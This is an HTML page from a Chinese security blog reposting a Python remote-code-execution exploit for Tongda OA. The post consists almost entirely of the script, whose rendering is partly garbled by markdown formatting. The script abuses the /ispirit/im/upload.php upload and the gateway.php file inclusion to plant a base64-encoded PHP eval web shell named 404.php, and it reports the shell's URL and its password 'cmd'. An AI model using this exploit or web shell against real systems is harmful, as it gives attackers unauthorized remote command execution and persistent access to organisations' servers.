@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>通达OA ispiritinterfacegateway.php文件包含rce - Chinchin&#39;s blog</title><meta name="Description" content="这是我的全新 Hugo 网站"><meta property="og:title" content="通达OA ispiritinterfacegateway.php文件包含rce" />
+<meta property="og:description" content="``` #!/usr/bin/env python3 -- encoding: utf-8 -- #https://mp.weixin.qq.com/s/K922zfgJpevXXBx1tWR8Ow &rsquo;&rsquo;&rsquo; @File : Tongda_rce.py @Time : 2020/03/19 12:00:00 @Author : Al1ex @Github : https://github.com/Al1ex &rsquo;&#39;&#39; import requests import re import sys def check(url): try: upload_url = url &#43; &#39;/ispirit/im/upload.php&#39; flag=&quot;nt authority\system&quot;; headers = { &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=----WebKitFormBoundaryBwVAwV3O4sifyhr3&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;, &quot;Connection&quot;: &quot;close&quot; } payload =&#39;&#39;&#39;------WebKitFormBoundaryBwVAwV3O4sifyhr3 Content-Disposition: form-data;" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/%E9%80%9A%E8%BE%BEoa-ispiritinterfacegateway.php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABrce/" /><meta property="og:image" content="http://example.org/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-12-08T01:08:29+08:00" />
+<meta property="article:modified_time" content="2023-12-08T01:08:29+08:00" /><meta property="og:site_name" content="Chinchin&#39;s blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://example.org/logo.png"/>
+
+<meta name="twitter:title" content="通达OA ispiritinterfacegateway.php文件包含rce"/>
+<meta name="twitter:description" content="``` #!/usr/bin/env python3 -- encoding: utf-8 -- #https://mp.weixin.qq.com/s/K922zfgJpevXXBx1tWR8Ow &rsquo;&rsquo;&rsquo; @File : Tongda_rce.py @Time : 2020/03/19 12:00:00 @Author : Al1ex @Github : https://github.com/Al1ex &rsquo;&#39;&#39; import requests import re import sys def check(url): try: upload_url = url &#43; &#39;/ispirit/im/upload.php&#39; flag=&quot;nt authority\system&quot;; headers = { &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=----WebKitFormBoundaryBwVAwV3O4sifyhr3&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;, &quot;Connection&quot;: &quot;close&quot; } payload =&#39;&#39;&#39;------WebKitFormBoundaryBwVAwV3O4sifyhr3 Content-Disposition: form-data;"/>
+<meta name="twitter:site" content="@xxxx"/>
+<meta name="application-name" content="Chinchin&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Chinchin&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/%E9%80%9A%E8%BE%BEoa-ispiritinterfacegateway.php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABrce/" /><link rel="prev" href="http://example.org/%E9%80%9A%E8%BE%BEoa-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4165/" /><link rel="next" href="http://example.org/%E9%80%9A%E8%BE%BEoa-get_datas.php%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "通达OA ispiritinterfacegateway.php文件包含rce",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/%E9%80%9A%E8%BE%BEoa-ispiritinterfacegateway.php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABrce\/"
+        },"genre": "posts","keywords": "2023hw","wordcount":  316 ,
+        "url": "http:\/\/example.org\/%E9%80%9A%E8%BE%BEoa-ispiritinterfacegateway.php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABrce\/","datePublished": "2023-12-08T01:08:29+08:00","dateModified": "2023-12-08T01:08:29+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Chinchin"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Chinchin&#39;s blog"><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Chinchin&#39;s blog"><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">通达OA ispiritinterfacegateway.php文件包含rce</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/2023hw/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>2023hw</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-12-08">2023-12-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;316 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;One minute&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="true">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents"></nav></div>
+            </div><div class="content" id="content"><pre><code>```
+</code></pre>
+<p>#!/usr/bin/env python3</p>
+<h1 id="---encoding-utf-8---">-<em>- encoding: utf-8 -</em>-</h1>
+<p>#https://mp.weixin.qq.com/s/K922zfgJpevXXBx1tWR8Ow
+&rsquo;&rsquo;&rsquo;
+@File    :   Tongda_rce.py
+@Time    :   2020/03/19 12:00:00
+@Author  :   Al1ex
+@Github   :   <a href="https://github.com/Al1ex" target="_blank" rel="noopener noreffer">https://github.com/Al1ex</a>
+
+&rsquo;''</p>
+<p>import requests
+import re
+import sys</p>
+<p>def check(url):</p>
+<pre><code>try:
+    upload_url = url + '/ispirit/im/upload.php'
+    flag=&quot;nt authority\system&quot;; 
+    headers = {
+      &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=----WebKitFormBoundaryBwVAwV3O4sifyhr3&quot;,
+      &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&quot;, 
+      &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,
+      &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;,  
+      &quot;Connection&quot;: &quot;close&quot;
+      }
+    payload ='''------WebKitFormBoundaryBwVAwV3O4sifyhr3
+</code></pre>
+<p>Content-Disposition: form-data; name=&ldquo;UPLOAD_MODE&rdquo;</p>
+<p>2
+&mdash;&mdash;WebKitFormBoundaryBwVAwV3O4sifyhr3
+Content-Disposition: form-data; name=&ldquo;P&rdquo;</p>
+<p>&mdash;&mdash;WebKitFormBoundaryBwVAwV3O4sifyhr3
+Content-Disposition: form-data; name=&ldquo;DEST_UID&rdquo;</p>
+<p>1
+&mdash;&mdash;WebKitFormBoundaryBwVAwV3O4sifyhr3
+Content-Disposition: form-data; name=&ldquo;ATTACHMENT&rdquo;; filename=&ldquo;jpg&rdquo;
+Content-Type: image/jpeg</p>
+<?php
+$fp = fopen('404.php', 'w');
+$a = base64_decode("PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==");
+fwrite($fp, $a);
+fclose($fp);
+?>
+<p>&mdash;&mdash;WebKitFormBoundaryBwVAwV3O4sifyhr3&ndash;
+&rsquo;''</p>
+<pre><code>    response = requests.post(upload_url, headers=headers, data=payload)
+    path = response.text
+    filename = path[path.find('@')+1:path.rfind('|')].replace(&quot;_&quot;,&quot;\/&quot;).replace(&quot;|&quot;,&quot;.&quot;).replace(&quot;\\&quot;,&quot;&quot;)
+    if response.status_code == 200 and &quot;OK&quot; in path:
+        result = include_file(url,filename)
+        shell_url=url+'/ispirit/interface/404.php'
+        verify = requests.get(shell_url)
+        if result.status_code == 200 and verify.status_code == 200:
+            return shell_url
+        else:
+            return 
+    else:
+        print(&quot;[+] File upload Fail!&quot;)
+        return
+except:
+   pass
+</code></pre>
+<p>def include_file(url,filename):
+include_url = url + &ldquo;/ispirit/interface/gateway.php&rdquo;
+headers = {
+&ldquo;User-Agent&rdquo;: &ldquo;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&rdquo;,
+&ldquo;Accept&rdquo;:&ldquo;text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8&rdquo;,
+&ldquo;Accept-Encoding&rdquo;: &ldquo;gzip, deflate&rdquo;,
+&ldquo;Accept-Language&rdquo;: &ldquo;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&rdquo;,<br>
+&ldquo;Content-Type&rdquo;:&ldquo;application/x-www-form-urlencoded&rdquo;,
+&ldquo;Connection&rdquo;: &ldquo;close&rdquo;
+}
+payload = {
+&ldquo;json&rdquo;:&quot;{&quot;url&quot;:&quot;/general/../../attach/im/&quot; + filename + &ldquo;&quot;}&rdquo;,
+}
+response = requests.post(include_url,headers=headers,data=payload)
+return response</p>
+<p>if <strong>name</strong> == &lsquo;<strong>main</strong>&rsquo;:
+print(&rsquo;&rsquo;'</p>
+<hr>
+<p>|__   <strong>|                |  __ \        |  __ \ / ____|  ____|
+| | ___  _ __   __ _  | |  | | __ _  | |</strong>) | |    | |__<br>
+| |/ _ | &lsquo;_ \ / <em><code> | | |  | |/ _</code> | |  _  /| |    |  __|<br>
+| | (</em>) | | | | (<em>| | | |__| | (</em>| | | | \ | |<strong><strong>| |</strong></strong>
+|<em>|___/|</em>| |<em>|_</em>, | |<em><strong><strong>/ _<em>,</em>| |_|  _\</strong></strong></em>|_____<em>|
+<strong>/ |                                   <br>
+|</strong></em>/                                    <br>
+&lsquo;&rsquo;&rsquo;)
+url = sys.argv[1]
+result = check(url)
+if result:
+print(&quot;[+] Congratulations target is vulnerable!!!&quot;)
+print(&quot;[+] Shell&rsquo;s URL is:&quot;+result)
+print(&quot;[+] Shell&rsquo;s password is cmd!&quot;)</p>
+<pre><code>else:
+    print(&quot;[-] There is no remote code execution vulnerability in the target address&quot;)
+</code></pre>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-12-08</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/%E9%80%9A%E8%BE%BEoa-ispiritinterfacegateway.php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABrce/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.org/%E9%80%9A%E8%BE%BEoa-ispiritinterfacegateway.php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABrce/" data-title="通达OA ispiritinterfacegateway.php文件包含rce" data-via="xxxx" data-hashtags="2023hw"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/%E9%80%9A%E8%BE%BEoa-ispiritinterfacegateway.php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABrce/" data-hashtag="2023hw"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.org/%E9%80%9A%E8%BE%BEoa-ispiritinterfacegateway.php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABrce/" data-title="通达OA ispiritinterfacegateway.php文件包含rce"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.org/%E9%80%9A%E8%BE%BEoa-ispiritinterfacegateway.php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABrce/" data-title="通达OA ispiritinterfacegateway.php文件包含rce"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.org/%E9%80%9A%E8%BE%BEoa-ispiritinterfacegateway.php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABrce/" data-title="通达OA ispiritinterfacegateway.php文件包含rce"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/2023hw/">2023hw</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/%E9%80%9A%E8%BE%BEoa-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4165/" class="prev" rel="prev" title="通达OA sql注入漏洞 CVE-2023-4165"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>通达OA sql注入漏洞 CVE-2023-4165</a>
+            <a href="/%E9%80%9A%E8%BE%BEoa-get_datas.php%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" class="next" rel="next" title="通达OA get_datas.php前台sql注入">通达OA get_datas.php前台sql注入<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Chinchin</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/index.umd.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"data":{"id-1":"首页","id-2":"首页"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
